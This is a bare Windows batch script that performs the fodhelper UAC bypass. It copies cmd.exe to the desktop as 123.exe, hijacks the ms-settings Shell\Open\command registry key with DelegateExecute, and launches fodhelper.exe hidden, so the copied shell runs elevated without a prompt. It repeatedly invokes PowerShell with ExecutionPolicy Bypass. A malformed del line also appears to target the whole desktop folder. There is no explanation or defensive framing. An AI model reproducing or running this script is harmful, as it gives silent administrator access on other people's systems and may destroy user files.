echo A | powershell -command Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Force
echo Y | del %userprofile%\desktop 123.exe
powershell.exe -ExecutionPolicy Bypass -Command copy C:\Windows\system32\cmd.exe c:\users\l_\desktop\123.exe
powershell.exe -ExecutionPolicy Bypass -Command New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
powershell.exe -ExecutionPolicy Bypass -Command New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Force
powershell.exe -ExecutionPolicy Bypass -Command Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value c:\users\l_\desktop\123.exe -Name '(Default)'
powershell.exe -ExecutionPolicy Bypass -Command Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
pause